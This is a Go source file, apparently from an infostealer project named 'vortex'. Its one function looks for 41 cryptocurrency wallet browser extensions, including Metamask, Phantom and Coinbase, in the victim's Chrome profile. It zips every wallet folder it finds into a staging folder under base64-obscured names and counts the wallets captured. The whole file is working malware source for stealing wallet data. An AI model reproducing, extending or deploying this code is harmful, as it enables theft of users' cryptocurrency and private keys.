package cryptowallets

import (
	"os"
	"path/filepath"
	"vortex/encrypt"
	"vortex/hutil"
)

func CryptoWalletsExtDump(mainFolder string) error {

	chromiumExtPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Extensions")

	wExts := map[interface{}]interface{}{
		"Tronlink":             "ibnejdfjmmkpcnlpebklmnkoeoihofec",
		"NiftyWallet":          "jbdaocneiiinmjbjlgalhcelgbejmnid",
		"Metamask":             "nkbihfbeogaeaoehlefnkodbefgpgknn",
		"MathWallet":           "afbcbjpbpfadlkmhmclhkeeodmamcflc",
		"Coinbase":             "hnfanknocfeofbddgcijnmhnfnkdnaad",
		"BinanceChain":         "fhbohimaelbohpjbbldcngcnapndodjp",
		"BraveWallet":          "odbfpeeihdkbihmopkbjmoonfanlbfcl",
		"GuardaWallet":         "hpglfhgfnhbgpjdenjgmdgoeiappafln",
		"EqualWallet":          "blnieiiffboillknjnepogjhkgnoapac",
		"JaxxxLiberty":         "cjelfplplebdjjenllpjcblmjkfcffne",
		"BitAppWallet":         "fihkakfobkmkjojpchpfgcmhfjnmnfpi",
		"iWallet":              "kncchdigobghenbbaddojjnnaogfppfj",
		"Wombat":               "amkmjjmmflddogmhpjloimipbofnfjih",
		"YoroiWallet":          "ffnbelfdoeiohenkjibnmadjiehjhajb",
		"TonCrystal":           "nphplpgoakhhjchkkhmiggakijnkhfnd",
		"Coin98Wallet":         "aeachknmefphepccionboohckonoeemg",
		"Phantom":              "bfnaelmomeimhlpmgjnjophhpkkoljpa",
		"GuildWallet":          "nanjmdknhkinifnkgdcggcfnhdaammmj",
		"Oxygen":               "fhilaheimglignddkjgofkcbgekhenbh",
		"LiqualityWallet":      "kpfopkelmapcoipemfendmdcghnegimn",
		"Iconex":               "flpiciilemghbmfalicajoolhkkenfel",
		"Mobox":                "fcckkdbjnoikooededlapcalpionmalo",
		"XinPay":               "bocpokimicclpaiekenaeelehdjllofo",
		"Sollet":               "fhmfendgdocmcbmfikdcogofphimnkno",
		"Slope":                "pocmplpaccanhmnllbbkpgfliimjljgo",
		"Starcoin":             "mfhbebgoclkghebffdldpobeajmbecfk",
		"Swash":                "cmndjbecilbocjfkibfbifhngkdmjgog",
		"Finnie":               "cjmkndjhnagcfbpiemnkdpomccnjblmj",
		"Keplr":                "dmkamcknogkgcdfhhbddcghachkejeap",
		"Crocobit":             "pnlfjmlcjdjgkddecgincndfgegkecke",
		"AtomWallet":           "jnggcdmajcokeakpdeagdhphmkioabem",
		"KardiaChain":          "pdadjkfkgcafgbceimcpbkalnfnepbnk",
		"TerraStation":         "aiifbnbfobpmeekipheeijimdpnlpgpp",
		"BoltX":                "aodkkagnadcbobfpggfnjeongemjbjca",
		"RoninWallet":          "fnjhmkhhmkbjkkabndcnnogagogbneec",
		"XdefiWallet":          "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
		"Nami":                 "lpfcbjknijpeeillifnkikgncikgfhdo",
		"MultiversXDeFiWallet": "dngmlblcodfobpdpecaadgfbcggfjfnm",
		"PaliWallet":           "mgffkfbidihjpoaomajlbgchddlicgpn",
		"TempleTezosWallet":    "ookjlbkiijinhpmnjffcofjonbfbgaoc",
		"ExodusWeb3Wallet":     "aholpfdialjgjfhomihkjbmgjidlcdno",
	}

	for k, v := range wExts {
		cWalletPath := filepath.Join(chromiumExtPath, v.(string))
		if _, err := os.Stat(cWalletPath); !os.IsNotExist(err) {
			if err := hutil.ZipFolder(k.(string), cWalletPath, filepath.Join(mainFolder, encrypt.B64Util("wallet-extension"+k.(string)+".zip", 0)), "XX"); err != nil {
				return err
			}
			hutil.WalletCounter++
		}
	}

	return nil
}
